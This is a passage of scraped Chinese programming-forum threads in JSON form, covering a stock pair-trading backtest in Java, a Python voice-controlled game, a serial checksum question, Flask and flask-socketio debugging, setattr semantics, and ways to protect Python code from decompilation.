org.apache.commons.math3.stat.regression.SimpleRegression;\nimport org.apache.commons.math3.stat.descriptive.DescriptiveStatistics;\nimport org.apache.commons.math3.analysis.function.Log;</p>\n<pre><code>public class PairTrading implements IHStrategy{\n    int count = 0;\n    double zScore;\n    double beta;\n    double shareStock1;\n    double shareStock2;\n    double spread;\n    double betShare;\n    double buyShare;\n    double portfolioValue;\n    double dailyReturn;\n    double initialCash;\n    @Override\n    public void init(IHInformer informer, IHInitializers initializers) {\n        \n\n        String stockId1 = \"600815.XSHG\";\n        String stockId2 = \"601002.XSHG\";\n        double closePrice[][] = new double[200][2];\n        // 这些参数值是在研究部分获取的\n        double beta = 0.418142479833;\n        double mean=7.27385228021;\n        double std  = 0.41596412236;\n\n\n\n        int numRows = closePrice.length;\n        int numCols = closePrice[0].length;\n        int period = 199;\n    \n\n\n        initializers.instruments((universe) -&gt; universe.add(stockId1, stockId2));\n        initializers.shortsell().allow();\n        initializers.events().statistics((stats, info, trans) -&gt; {\n            //获取两只股票的日线数据\n            double[] closePxInStockId1 = stats.get(stockId1).history(period + 1, HPeriod.Day).getClosingPrice();\n            double[] closePxInStockId2 = stats.get(stockId2).history(period + 1, HPeriod.Day).getClosingPrice();\n            //每次对冲的多头头寸控制为当前持有现金的 0.6\n            betShare = info.portfolio().getAvailableCash()*0.6/closePxInStockId2[199];   \n            portfolioValue = info.portfolio().getPortfolioValue();\n            dailyReturn = info.portfolio().getDailyReturn();\n            initialCash = info.portfolio().getInitialCash();\n            buyShare = beta*betShare;\n            \n            if (dailyReturn &lt; 0){\n                count = count + 1;\n            }\n            \n           \n            if (buyShare &lt; 100){\n                buyShare =100;\n            }\n            shareStock1 = info.position(stockId1).getNonClosedTradeQuantity();\n            shareStock2 = info.position(stockId2).getNonClosedTradeQuantity();\n            //计算两只股票之间的价差\n            spread = closePxInStockId2[199] - beta*closePxInStockId1[199];\n            //计算 zScore\n            zScore = (spread - mean)/std;\n            informer.plot(\"zScore\", zScore);\n//当入场信号来的时候，进入市场  \n            if ((zScore &gt; 1.1  ) &amp;&amp; (shareStock1 == 0) &amp;&amp; (shareStock2 == 0)){               \n                trans.sell(stockId2).shares(betShare).commit();\n                trans.buy(stockId1).shares(buyShare).commit();\n            }\n            if ((zScore &lt; -1.5) &amp;&amp; (shareStock2 == 0) &amp;&amp; (shareStock1 == 0)){ \n                trans.sell(stockId1).shares(buyShare).commit();\n                trans.buy(stockId2).shares(betShare).commit();\n            }\n//当出场信号来的时候，离开市场\n            if ((zScore &lt; 0.8) &amp;&amp; (zScore &gt; -1.0) &amp;&amp; (shareStock1 != 0) &amp;&amp; (shareStock2 != 0) ){\n                if (shareStock1 &gt; 0){\n                    trans.sell(stockId1).shares(shareStock1).commit();\n                }\n                if (shareStock1 &lt; 0){\n                    trans.buy(stockId1).shares(-shareStock1).commit();\n                }    \n                if (shareStock2 &gt; 0){\n                    trans.sell(stockId2).shares(shareStock2).commit();\n                }\n                if (shareStock2 &lt; 0){\n                    trans.buy(stockId2).shares(-shareStock2).commit();\n                    \n                }\n            }            \n        });\n    }\n}\n</code></pre>\n<p>几个重要的回测结果为：夏普率 2.1236 ， 最大回撤 7.450%，回测收益 36.050%，同期基准收益为-7.800%.观察交易详情可以看出交易的时间点较为平均的分散在全年各个时间段。\n策略优化\n我们发现策略的最大回撤为 7.450%。为了降低最大回撤,我们可以加入一个止损的方法,即经典的“ Cut the lose and let the winning run ”。思路为:如果连续亏损达到四天以上,则平仓退场。回测时间为 2013 年全年 (一定要手选然后选对)，初始资金为 100000.0\nimport org.apache.commons.math3.stat.regression.SimpleRegression;\nimport org.apache.commons.math3.stat.descriptive.DescriptiveStatistics;\nimport org.apache.commons.math3.analysis.function.Log;</p>\n<p>public class PairTrading implements IHStrategy{\nint count = 0;\ndouble zScore;\ndouble beta;\ndouble shareStock1;\ndouble shareStock2;\ndouble spread;\ndouble betShare;\ndouble buyShare;\ndouble portfolioValue;\ndouble dailyReturn;\ndouble initialCash;\n@Override\npublic void init(IHInformer informer, IHInitializers initializers) {</p>\n<pre><code>        String stockId1 = \"600815.XSHG\";\n        String stockId2 = \"601002.XSHG\";\n        double closePrice[][] = new double[200][2];\n        // 这些参数值是在研究部分获取的\n        double beta = 0.418142479833;\n        double mean=7.27385228021;\n        double std  = 0.41596412236;\n\n\n\n        int numRows = closePrice.length;\n        int numCols = closePrice[0].length;\n        int period = 199;\n    \n\n\n        initializers.instruments((universe) -&gt; universe.add(stockId1, stockId2));\n        initializers.shortsell().allow();\n        initializers.events().statistics((stats, info, trans) -&gt; {\n            //获取两只股票的日线数据\n            double[] closePxInStockId1 = stats.get(stockId1).history(period + 1, HPeriod.Day).getClosingPrice();\n            double[] closePxInStockId2 = stats.get(stockId2).history(period + 1, HPeriod.Day).getClosingPrice();\n            //每次对冲的多头头寸控制为当前持有现金的 0.6\n            betShare = info.portfolio().getAvailableCash()*0.6/closePxInStockId2[199];   \n            portfolioValue = info.portfolio().getPortfolioValue();\n            dailyReturn = info.portfolio().getDailyReturn();\n            initialCash = info.portfolio().getInitialCash();\n            buyShare = beta*betShare;\n            //此处为引入的止损。当每天的收益连续四天以上为负的时候则止损\n            if (dailyReturn &lt; 0){\n                count = count + 1;\n            }\n            if (count &gt; 4){\n               if (shareStock1 &gt; 0){\n                    trans.sell(stockId1).shares(shareStock1).commit();\n                    }\n               if (shareStock1 &lt; 0){\n                   trans.buy(stockId1).shares(-shareStock1).commit();\n                }    \n                if (shareStock2 &gt; 0){\n                    trans.sell(stockId2).shares(shareStock2).commit();\n                }\n                if (shareStock2 &lt; 0){\n                    trans.buy(stockId2).shares(-shareStock2).commit();\n                }\n                count = 0;\n            }\n            if (buyShare &lt; 100){\n                buyShare =100;\n            }\n            shareStock1 = info.position(stockId1).getNonClosedTradeQuantity();\n            shareStock2 = info.position(stockId2).getNonClosedTradeQuantity();\n            //计算两只股票之间的价差\n            spread = closePxInStockId2[199] - beta*closePxInStockId1[199];\n            //计算 zScore\n            zScore = (spread - mean)/std;\n            informer.plot(\"zScore\", zScore);\n//当入场信号来的时候，进入市场  \n            if ((zScore &gt; 1.1  ) &amp;&amp; (shareStock1 == 0) &amp;&amp; (shareStock2 == 0)){               \n                trans.sell(stockId2).shares(betShare).commit();\n                trans.buy(stockId1).shares(buyShare).commit();\n            }\n            if ((zScore &lt; -1.5) &amp;&amp; (shareStock2 == 0) &amp;&amp; (shareStock1 == 0)){ \n                trans.sell(stockId1).shares(buyShare).commit();\n                trans.buy(stockId2).shares(betShare).commit();\n            }\n//当出场信号来的时候，离开市场\n            if ((zScore &lt; 0.8) &amp;&amp; (zScore &gt; -1.0) &amp;&amp; (shareStock1 != 0) &amp;&amp; (shareStock2 != 0) ){\n                if (shareStock1 &gt; 0){\n                    trans.sell(stockId1).shares(shareStock1).commit();\n                }\n                if (shareStock1 &lt; 0){\n                    trans.buy(stockId1).shares(-shareStock1).commit();\n                }    \n                if (shareStock2 &gt; 0){\n                    trans.sell(stockId2).shares(shareStock2).commit();\n                }\n                if (shareStock2 &lt; 0){\n                    trans.buy(stockId2).shares(-shareStock2).commit();\n                    \n                }\n            }            \n        });\n    }\n}\n</code></pre>\n<p>最大回撤降低为 6.650%。最大回测降低的并不多,但是夏普率提高到了 2.3372 ，回测收益也提高到了 41.80%。这为大家提供了一个思路,大家可以尝试不同的止损策略来看看效果如何。</p>\n<p>米筐量化交易平台： <a href=\"http://www.ricequant.com\" rel=\"nofollow\">http://www.ricequant.com</a>\n量化炒股 QQ 群： 484490463   群内大神每日在线讲解代码，用 Python 自动赚钱！</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "配对交易(Paper Version)", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>就是前几天有个很火的岛国小游戏，对着话筒喊，里面小人就会走啊跳啊的《休むな!8 分音符ちゃん?》</p>\n<p>花了半天时间，用了大概一百行代码，用 cocos2d-python + pyaudio 改了下。</p>\n<p>然后昨天又就着自己的恶趣味，改得更魔性了一点。还加了个联机的排行榜。玩起来画风是这样的：</p>\n<p><a href=\"https://v.qq.com/x/page/z0380ogn3e7.html\" rel=\"nofollow\">https://v.qq.com/x/page/z0380ogn3e7.html</a></p>\n<p>游戏和代码都可以下载：</p>\n<p>游戏 win 版：\n<a href=\"http://git.oschina.net/crossin/learn-python/raw/master/voicegame/build/ppx-win.zip\" rel=\"nofollow\">http://git.oschina.net/crossin/learn-python/raw/master/voicegame/build/ppx-win.zip</a></p>\n<p>mac 版：\n<a href=\"http://git.oschina.net/crossin/learn-python/raw/master/voicegame/build/ppx-mac.zip\" rel=\"nofollow\">http://git.oschina.net/crossin/learn-python/raw/master/voicegame/build/ppx-mac.zip</a></p>\n<p>windows 解压后运行 game.exe ，不要在有中文目录下，确保电脑有话筒。\nmac 解压后右键打开，不然会提示不信任。</p>\n<p>源码：\n<a href=\"http://git.oschina.net/crossin/learn-python/tree/master/voicegame\" rel=\"nofollow\">http://git.oschina.net/crossin/learn-python/tree/master/voicegame</a></p>\n<p>另外之前还是用 cocos2d-python 写过《贪吃蛇大作战》：</p>\n<p><a href=\"https://v.qq.com/x/page/n0326alzz7n.html\" rel=\"nofollow\">https://v.qq.com/x/page/n0326alzz7n.html</a></p>\n<p>贪吃蛇源码：\n<a href=\"https://github.com/crossin/gluttonous\" rel=\"nofollow\">https://github.com/crossin/gluttonous</a></p>\n</div></div>"], "reply": "31", "tittle": "100 行 Python 山寨了下上周比较火的那个呻吟游戏，坐等被喷", "comment": ["66666 很不错～", "魔性~", "感觉这个游戏做成手机版很有前途", "666666666666666666", "魔性的游戏 ", " ", "6666666", "来喊一把 66666666666", " 最初想法想做成 html5 版本，但尝试了下，发现对声音输入的支持太差了", " 已经有人做了。。", "支持 皮皮虾 你很皮 我给你说 ", "   不要皮 打死你! ", "    ", " ", "学习到了,赞一下!", "没有共产党, 哪里会有新中国!", "66666", "稳！", "2017-03-01 15:20:07.915 game[6291:3338306] 15:20:07.915 WARNING:  140: This application, or a library it uses, is using the deprecated Carbon Component Manager for hosting Audio Units. Support for this will be removed in a future release. Also, this makes the host incompatible with version 3 audio units. Please transition to the API's in AudioComponent.h.\r", "Traceback (most recent call last):\r", "  File \"/Users/crossin/Downloads/code/PURE_PYTHON/lib/python2.7/site-packages/cx_Freeze/initscripts/__startup__.py\", line 12, in <module>\r", "  File \"/Users/crossin/Downloads/code/PURE_PYTHON/lib/python2.7/site-packages/cx_Freeze/initscripts/Console.py\", line 24, in <module>\r", "  File \"game.py\", line 137, in <module>\r", "  File \"/Users/crossin/Downloads/code/PURE_PYTHON/lib/python2.7/site-packages/cocos/director.py\", line 406, in run\r", "  File \"/Users/crossin/Downloads/code/PURE_PYTHON/lib/python2.7/site-packages/pyglet/app/base.py\", line 136, in run\r", "  File \"/Users/crossin/Downloads/code/PURE_PYTHON/lib/python2.7/site-packages/pyglet/app/base.py\", line 165, in _run_estimated\r", "  File \"/Users/crossin/Downloads/code/PURE_PYTHON/lib/python2.7/site-packages/pyglet/app/base.py\", line 274, in idle\r", "  File \"/Users/crossin/Downloads/code/PURE_PYTHON/lib/python2.7/site-packages/pyglet/clock.py\", line 300, in call_scheduled_functions\r", "  File \"game.py\", line 83, in update\r", "  File \"/Users/crossin/Downloads/code/PURE_PYTHON/lib/python2.7/site-packages/pyaudio.py\", line 608, in read\r", "IOError: [Errno -9981] Input overflowed\r", "\r", "Mac 版运行后闪退，这个是终端里直接运行主程序得到的日志 :)", " 每次都会吗？\r", "这个应该是音频输入没找到的问题，你是不是 mac-mini ？插上个耳机（或者拔掉）再试试看", " 但讲真， high 一下还好，真的做成游戏，每天都对着喊可吃不消\r", "另外，肯定不是 ios 版吧，以现在国内游戏审批的尿性……", " #16  ", "\r", "MacBook Air ……", " 我大概猜到是什么问题……但不确定，因为我这里确实偶发过，很难重现。\r", "就是打开来如果读取时间长了一点，声音那里就会报错。我尝试改过，现在看来还是没改对。\r", "\r", "如果你是从源码运行的话，可以试下把\r", "self.NUM_SAMPLES = 1000  # pyAudio 内部缓存的块的大小\r", "这个值改得大一些，可能就好了", "Crossin 的作品啊，支持一下。", "\r", "\r", "我这里在 44100 的采样率下， NUM_SAMPLES 改到 2048 后才解决问题，还有 84 行的\r", "k = max(struct.unpack('1000h', string_audio_data))\r", "也要做相应调整……", " 感谢，我更新了。", "Crossin 老师好，我是你的粉丝：）", "不错", "我记得原版是看声调不是声音大小吧。。", "好像在虎扑看到了你的帖子，他强任他强", " 真是到哪里都能碰上 jr", "城会玩.", "66666666666666666 我服辣！\r", "\r", " 确实不是声音大小，貌似是声调一段时间内升高的幅度。", " 来窝火吧", " 好用吗？现在太多，都不知道哪个好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在写一个检验仪器的串口指令发送，需要对发送数据 Checksum ，仪器发给电脑的接收数据，仪器已经 Checksum 了。如下原始数据</p>\n<pre><code>5C|1|I|In Check Range|I                                       \nFD （上一行的 Checksum 值）                                             \n7C|1|I|In Check Range|I                                       \nFF （上一行的 Checksum 值）                                             \n0R|4|^^^HBs^^^1^RLU|8982|||H|N|R||||20161229094052|IRL55791525\nE1 （上一行的 Checksum 值）                                             \n1C|1|I|In Check Range|I                                       \nF9 （上一行的 Checksum 值）                                             \n2L|1|N                                                        \n05 （上一行的 Checksum 值） \n</code></pre>\n<p>使用</p>\n<pre><code>0x04+0x00+0x38+0x00+0x01=0x3d= - 0x3C;  // - 0x3d=3C; \n</code></pre>\n<p>也无法算对，有明白的没法给指点下。\n另外对于串口的应答方式有什么灵活办法处理吗？\n我现在是 n=serial.inWaiting()，如果 n=1 ，判断是 ACK 还是 ENQ 等，并做相应的应答写死在程序里面。但是如果一段数据结尾有 ENQ 我该怎么处理，每次收到不为空数据 data[-1:]判断并进行应答？</p>\n</div></div>"], "reply": "1", "tittle": "Python 的 Checksum 为什么结果是一长串数字而不是如下效果", "comment": ["0x04+0x00+0x38+0x00+0x01\r", "我算出结果是 61"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>新手在学 flask 开发 T.T ，看到《 python web 开发》第十章的用户资料，\n在搞 <strong>管理员级别的资料编辑器</strong> 那里出问题了，\n<strong>视图函数抛出异常，不能返回响应</strong>\n。百度，谷歌， sof 无果。找好久了没解决，心塞\n所以来寻求帮助，谢谢能提供帮助的人。\n这是整个文件夹\n<a href=\"http://pan.baidu.com/s/1kV4sXcr\" rel=\"nofollow\">http://pan.baidu.com/s/1kV4sXcr</a></p>\n<pre><code>ValueError\nValueError: View function did not return a response\n\nTraceback (most recent call last)\nFile \"D:\\web_develop\\venv\\lib\\site-packages\\flask-0.12-py2.7.egg\\flask\\app.py\", line 1994, in __call__\nreturn self.wsgi_app(environ, start_response)\nFile \"D:\\web_develop\\venv\\lib\\site-packages\\flask-0.12-py2.7.egg\\flask\\app.py\", line 1985, in wsgi_app\nresponse = self.handle_exception(e)\nFile \"D:\\web_develop\\venv\\lib\\site-packages\\flask-0.12-py2.7.egg\\flask\\app.py\", line 1540, in handle_exception\nreraise(exc_type, exc_value, tb)\nFile \"D:\\web_develop\\venv\\lib\\site-packages\\flask-0.12-py2.7.egg\\flask\\app.py\", line 1982, in wsgi_app\nresponse = self.full_dispatch_request()\nFile \"D:\\web_develop\\venv\\lib\\site-packages\\flask-0.12-py2.7.egg\\flask\\app.py\", line 1615, in full_dispatch_request\nreturn self.finalize_request(rv)\nFile \"D:\\web_develop\\venv\\lib\\site-packages\\flask-0.12-py2.7.egg\\flask\\app.py\", line 1630, in finalize_request\nresponse = self.make_response(rv)\nFile \"D:\\web_develop\\venv\\lib\\site-packages\\flask-0.12-py2.7.egg\\flask\\app.py\", line 1725, in make_response\nraise ValueError('View function did not return a response')\nValueError: View function did not return a response\n</code></pre>\n<p>##路由视图 <a href=\"http://views.py\" rel=\"nofollow\">views.py</a> ：</p>\n<pre><code>@main.route('/edit-profile/&lt;int:id&gt;', methods=['GET', 'POST'])\n@login_required\n@admin_required\ndef edit_profile_admin(id):\n\tuser = User.query.get_or_404(id)\n\tform = EditProfileAdminForm(user=user)\n\tif form.validate_on_submit():\n\t\tuser.email = form.email.data\n\t\tuser.username = form.username.data\n\t\tuser.confirmed = form.confirmed.data\n\t\tuser.role = Role.query.get(form.role.data)\n\t\tuser.name = form.name.data\n\t\tuser.location = form.location.data\n\t\tuser.about_me = form.about_me.data\n\t\tdb.session.add(user)\n\t\tflash('The profile has been updated.')\n\t\treturn redirect(url_for('.user', username=user.username))\n\tform.email.data = user.email\n\tform.username.data = user.username\n\tform.confirmed.data = user.confirmed\n\tform.role.data = user.role_id\n\tform.name.data = user.name\n\tform.location.data = user.location\n\tform.about_me.data = user.about_me\n\treturn render_template('edit_profile.html', form=form, user=user)\n</code></pre>\n<p>##表单 <a href=\"http://forms.py\" rel=\"nofollow\">forms.py</a>:</p>\n<pre><code>class EditProfileAdminForm(FlaskForm):\n\temail = StringField('Email', validators=[Required(), Length(1, 64),\n\t\tEmail()])\n\tusername = StringField('Username', validators=[\n\t\tRequired(), Length(1, 64), Regexp('^[A-Za-z][A-Za-z0-9_.]*$', 0,\n\t\t\t\t\t\t\t\t\t\t  'Username must have only letters,'\n\t\t\t\t\t\t\t\t\t\t   'number, dots or underscores')])\n\tconfirmed = BooleanField('Confirmed')\n\trole = SelectField('Role', coerce=int)\n\tname = StringField('Real name', validators=[Length(0, 64)])\n\tlocation = StringField('Location', validators=[Length(0, 64)])\n\tabout_me = TextAreaField('About me')\n\tsubmit = SubmitField('Submit')\n\t\n\tdef __init__(self, user, *args, **kwargs):\n\t\tsuper(EditProfileAdminForm, self).__init__(*args, **kwargs)\n\t\tself.role.choices = [(role.id, role.name)\n\t\t\t\t\t\t\t for role in Role.query.order_by(Role.name).all()]\n\t\tself.user = user\n\t\t\n\tdef validate_email(self, field):\n\t\tif field.data != self.user.email and \\\n\t\t\t\tUser.query.filter_by(email=field.date).first():\n\t\t\traise ValidationError('Emai already registered.')\n\t\n\tdef validate_username(self, field):\n\t\tif field.data !=self.user.username and \\\n\t\t\t\tUser.query.filter_by(username=field.data).first():\n\t\t\traise ValidationError('Username already in use.')\n</code></pre>\n<p>##模板 edit_profile.html ：</p>\n<pre><code>{% extends \"base.html\" %}\n{% import \"bootstrap/wtf.html\" as wtf %}\n\n{% block title %}Flasky - Edit Profile{% endblock %}\n\n{% block page_content %}\n&lt;div class=\"page-header\"&gt;\n\t&lt;h1&gt;Edit Your Profile&lt;/h1&gt;\n&lt;/div&gt;\n&lt;div class=\"col-md-4\"&gt;\n\t{{ wtf.quick_form(form) }}\n&lt;/div&gt;\n{% endblock %}\n</code></pre>\n</div></div>"], "reply": "5", "tittle": "求助,ValueError: View function did not return a response", "comment": ["没渲染到模板？楼主试试 ret = render_template('edit_profile.html', form=form, user=user)\r", "\r", "然后 print 看看 ret 里头是啥再 return\r", "\r", "可能是路径配错了。\r", "\r", "另外貌似楼主所有的缩进都是 TAB ，而不是空格。", "为啥不去作者 github 问", " 谢谢你的回答\r", "试了你的方法抛出错误一样，没 print 出啥东西。\r", "\r", "其他网友找到问题了,检查用户权限的自定义装饰器出问题了 decorators.py ：\r", "\r", "```\r", "def permission_required(permission):\r", "     def decorator(f):\r", "          @", "(f)\r", "          def decorated_function(*args, **kwargs):\r", "               if not current_user.can(permission):\r", "                    abort(403)\r", "                    return f(*args, **kwargs)          # 此行缩进错误，应在 if 语句外\r", "          return decorated_function\r", "     return decorator\r", "```\r", "\r", "修改过来就可以了。\r", "\r", "T.T ，真是自己粗心大意。\r", "python 代码缩进问题，我特意去查了，网友都建议缩进用 4 个空格，用 1 个 tab 代替风险太大，因为各家的编辑器对 tab 键定义存在差异，很容易出问题。虽然说我这问题不是出在 tab 上，之后我还是会注意这个问题的。感谢。\r", "\r", "不过我还有一问题，为什么错误页面抛出的是 视图函数 View function 的问题，\r", "而不会抛出装饰器那边的错误，例如（ IndentationError ）：\r", " → def permission_required(permission)\r", "谢谢", " \r", "谢谢回答，因为我想如果能在这解决就快一点\r", "如果不能解决再去 github 问的\r", "用了你的建议上午确实也去作者 github 提交了提问 T.T\r", "看来我要自答告诉作者解决了~", "  = = 没 print 出东西本身就已经说明了很多问题，要么是输出是 None 、'' 之类，要么是代码没执行。\r", "\r", "调试的时候顺藤摸瓜向下找就是了。\r", "\r", "关于你抛出异常的函数的疑问，原因是你的 View function 就是带上装饰器之后的函数。\r", "\r", "而不是你的初始函数了。装饰器实际上产生了一个新的函数传入进去。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><ol>\n<li>\n<p>setattr(obj, attr, value) just calls obj.<strong>setattr</strong>(attr, value), at least for new-style classes.</p>\n</li>\n<li>\n<p>setattr(instance, name, value) is syntactic sugar for instance.<strong>setattr</strong>(name, value).</p>\n</li>\n<li>\n<p>You would only need to call object.<strong>setattr</strong>(...) inside a class definition, and then only if directly subclassing object -- if you were subclassing something else, Spam for example, then you should either use super() to get the next item in the heirarchy, or call Spam.<strong>setattr</strong>(...) -- this way you don't risk missing behavior that super-classes have defined by skipping over them directly to object.</p>\n</li>\n<li>\n<p>The code is probably using object.<strong>setattr</strong> for the exact purpose of skipping the superclass's setattr</p>\n</li>\n<li>\n<p>英文好的麻烦给翻译翻译上面的 4 段话的意思。感谢！</p>\n</li>\n</ol>\n</div></div>"], "reply": "10", "tittle": "Python setattr()也__setattr__有什么区别联系呢？看了个 stackoverflow 答案，不是太懂，各位求解释下。", "comment": ["setattr(instance, name, value)是 instance.__setattr__(name, value)的语法糖。", "setattr(instance, name, value) 是静态方法,意思为 给一个实例赋值一个属性值\r", "\r", "instance.setattr(name, value) 是面向对象方法, 意思为一个实例设置一个属性值.", "setattr 是你在外部调用的\r", "__setattr__ 是你在类里面实现的", " 意思就是我在外部用 setattr 其实是调用类里面的__setattr__方法喽？", "其实我主要想知道第三段和第四段的意思？", " 那么这两者的功能是等价的吗？", "等价的.\r", "\r", "我理解的意思是:\r", "\r", "在类里面可以调用 self.attr(*) 也可以调用 super().attr(*). 这是继承的概念 \r", "调用 instance.attr(*)只会执行 instance 的 attr 的方法,从而隐藏了 super(*).\r", "\r", "这在 OO 思想里面就是把静态方法变成实例方法, 是思想里面的差距, 和使用功能上没有差距.\r", "另外通过 instance.attr(*) 可以达到链式表达式的效果", " 你可以实现 __setattr__ 来改变属性被赋值时的行为", "5. 英文也不好，谢谢。", "setattr(obj,name,value)相当于 obj.name=value\r", "而作为函数可以更方便调用，通常用于 name 为变动值时。\r", "\r", "__setattr__(self,name,value)是自定义对象方法，\r", "用来重新定义对像的 obj.name=value 时操作\r", "默认行为为 self.__dict__[name]=value,\r", "通常用于设置检查 value 是否合法的情况。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://morepypy.blogspot.com/2017/03/async-http-benchmarks-on-pypy3.html\" rel=\"nofollow\">https://morepypy.blogspot.com/2017/03/async-http-benchmarks-on-pypy3.html</a></p>\n<p><img alt=\"\" src=\"https://1.bp.blogspot.com/-cjlKx06ZBaY/WLb_S3TBWuI/AAAAAAAAAmI/s2fsZ-SaJiwS2B-nAmyTheJfMQrKFHuQACK4B/s640/graphs.png\">\n<img alt=\"\" src=\"https://4.bp.blogspot.com/-Qn9iiR_-ZKA/WLb_pXFG9mI/AAAAAAAAAmQ/rvEYKM1KYbIzFmTeu9utt9oNALlc9mTNwCK4B/s640/table.png\"></p>\n<p>我觉得还是先谈谈内存占用问题吧...</p>\n</div></div>"], "reply": "2", "tittle": "pypy3 vs CPython 3.5", "comment": ["内存很便宜", "sanic"]},
{"content": "", "reply": "41", "tittle": "最近用 Python 写了个工具，有没有什么办法防止被反编译", "comment": ["代码混淆？", "请大牛们指导下", "我印象中好像没啥好办法，不过 google 了一下，在知乎上找到了一个问题，你可以参考下\r", " #3 好的", "关键代码包装成服务， http 调用", "开源就不会被反编译了。", " #6  ", " ", " #5 额。这是个办法、、、", "python 大神去那公司有这技术，叫什么 dropbox 公司", "用 Cython 編譯代碼然後打包成 egg 或者 wheel 文件", " #10 我想打包成在 windwos 下执行的", "带有这种目的的 task 我都尽量尝试用 c++来完成。", " #12 大牛", "真要反编译你的程序，不做加壳之类的一些加固处理也是分分钟的事，用啥语言都一样，做了防护处理也得看是那群人盯上你的程序了", " wheel 文件可以跨平台的, 現在 ", " 上面都是 wheel 文件了", "自带 bug ，漏洞百出的程序不怕被人抄袭。如果真是写程序的高人，也不怕抄， Linux ， Python 之父都是搞开源的", " #14 比较赞同 你得看是什么人顶上你的程序 真正的逆向高手那里...哪些商业软件被爆菊都是正常的 只是别人搞不搞你", "#include <python.h>\r", "#include <stdio.h>\r", "#include <stdlib.h>\r", "\t\r", "\r", "int main(int argc, char *argv[])\r", "{\r", "        \r", "        Py_Initialize();\r", "\r", "        FILE * fp = NULL;\r", "        \r", "        PyRun_SimpleString(\"execfile('test.py')\"); \r", "\r", "\r", "        Py_Finalize();\r", "        \r", "        printf(\"---------------------END--------------------\\n\");\r", "\r", "        return 0;\r", "}\r", "\r", "有启发没 明显你没看过 python 的源代码", " #18 知道了。拜拜", "混淆字节码", "最安全的办法就是用自己写的 python 解析器 /斜眼笑", " #21  ", " ", "没有，下一题 23333", "用 cython 编译成 c", "某公司出售的分布式扫描器就是自己研发的 python 解释器，改了字节码。别无他法。", "或许可以试试用 ", " 编译成 c ?", "转成 exe ，然后加加密壳，能防住大多数人了", "nuitka", "这个只有法律手段了。", "IronPython ，编译成 .NET ？", " #30 不行吧", "现在有工具能编译成 golang ，再编译。", "没什么办法能够完全阻止反编译。给予足够的付出，任何程序都可以逆向出来\r", "\r", "你首先要考虑别人反编译你的程序会得到什么好处，如果能够降低其逆向价值，先降低其逆向给人带来的价值\r", "\r", "如果不能，那么你只要找到一个逆向代价比这个价值高的保护手段就可以了", " #33 赞", "nuitka 编译。。。", "同意 lss 观点，真的有人想破根本没办法防的，想想这么多单机游戏怎么被破解，还被汉化的...\r", "应该有不少游戏也是用 Python 当逻辑脚本的，不得不承认的确有人看汇编就像看代码一样", "编译成 pyo 然后打包成 exe", " 某公司是？", " 感谢", "用 cython 把文件转换成二进制的 pyd 不就行了么，看这里  ", " #40 我试试"]},
{"content": ["<div class=\"topic_content\">本人是新手，第一次尝试写个简单功能，已经被折腾好几天了\r<br>我用 flask 框架， flask-socketio 。写了一个服务器端实时传送数据展示在前端的程序，但是问题是，前端无法收到后端发送的数据，全部阻塞在服务器上了\r<br>前端也无法收到后端的数据，但是我的 websocket 管道已经建立\r<br>\r<br> 5d81f64ec0d14cc5a5a70c075caaefdd: Received request to upgrade to websocket\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Received packet MESSAGE data 2[\"message\",{\"data\":\"hello\"}]\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Sending packet MESSAGE data 2[\"server_response\",{\"data\":\"welcome\"}]\r<br>127.0.0.1 - - [01/Mar/2017 15:19:35] \"POST /socket.io/?EIO=3&amp;transport=polling&amp;t=Lg8lGsx&amp;sid=5d81f64ec0d14cc5a5a70c075caaefdd HTTP/1.1\" 200 219 0.001000\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Sending packet NOOP data None\r<br>127.0.0.1 - - [01/Mar/2017 15:19:35] \"GET /socket.io/?EIO=3&amp;transport=polling&amp;t=Lg8lGsx.0&amp;sid=5d81f64ec0d14cc5a5a70c075caaefdd HTTP/1.1\" 200 260 0.000000\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Upgrade to websocket successful\r<br>\r<br>想问一下 各位大神，我的问题出在哪里，有没有什么好的解决办法。\r<br>\r<br>前端触发  onclick 后，发送的全是空：\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Received packet MESSAGE data 2[\"message\",{\"data\":\"wawawa\"}]\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Sending packet MESSAGE data 2[\"server_response\",{\"data\":\"\"}]\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Received packet MESSAGE data 2[\"message\",{\"data\":\"aaaaa\"}]\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Sending packet MESSAGE data 2[\"server_response\",{\"data\":\"\"}]\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Received packet MESSAGE data 2[\"message\",{\"data\":\"dsdaaf\"}]\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Sending packet MESSAGE data 2[\"server_response\",{\"data\":\"\"}]\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Received packet MESSAGE data 2[\"message\",{\"data\":\"ddddwdad\"}]\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Sending packet MESSAGE data 2[\"server_response\",{\"data\":\"\"}]\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Received packet MESSAGE data 2[\"message\",{\"data\":\"adadeeel\"}]\r<br>5d81f64ec0d14cc5a5a70c075caaefdd: Sending packet MESSAGE data 2[\"server_response\",{\"data\":\"\"}]\r<br>\r<br>代码：\r<br>服务端：\r<br>@<a target=\"_blank\" href=\"/member/socketio\">socketio</a>.on('connect_event')\r<br>def connectevent(job_name):\r<br>    if job_name['data'] == 'hello':\r<br>        emit('serverresponse',{'data':'welcome'})\r<br>    else:\r<br>        log_command = ['tailf','/var/log/messages']\r<br>        log_out = subprocess.Popen(log_command,stdout=subprocess.PIPE)\r<br>        while log_out:\r<br>            out = log_out.stdout.readline().strip()\r<br>            emit('serverresponse',{'data':out})\r<br>\r<br>while 里 print  out ，是可以打印出来的，但是 emit 的时候却无法发送给前端\r<br>\r<br>前端：\r<br>    var socket = io.connect('http://' + document.domain + ':' + location.port);\r<br>    var name = 'hello'\r<br>\r<br>    function jobname(name){\r<br>        socket.emit('connect_event',{'data':name});\r<br>        return 